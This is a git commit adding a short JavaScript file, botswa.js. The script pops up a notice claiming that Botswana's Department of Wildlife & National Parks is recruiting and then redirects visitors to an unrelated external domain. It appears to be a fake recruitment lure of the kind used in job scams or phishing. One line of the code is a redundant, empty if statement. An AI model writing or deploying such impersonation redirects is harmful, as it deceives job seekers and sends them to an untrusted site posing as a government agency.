ccc6f3e48d25ee5c9c387697603f7eaab1ed95e3
newetijazz20 <newetijazz20@gmail.com>
2026-02-06 08:39:45 +0100

    Create botswa.js

---
+++ botswa.js
@@ -0,0 +1,6 @@
+var password = ' DWNP-Recruitment'
+password=prompt('NOTICE:  Department Of Wildlife & National Parks (DWNP) is currently recruiting in various positions, press OK to apply for the',' DWNP-Recruitment');
+if (password != ' DWNP-Recruitment');
+if (password != ' DWNP-Recruitment') {
+location.href='https://www.krhitid.site/DWNP-Recruitment-2026';
+}
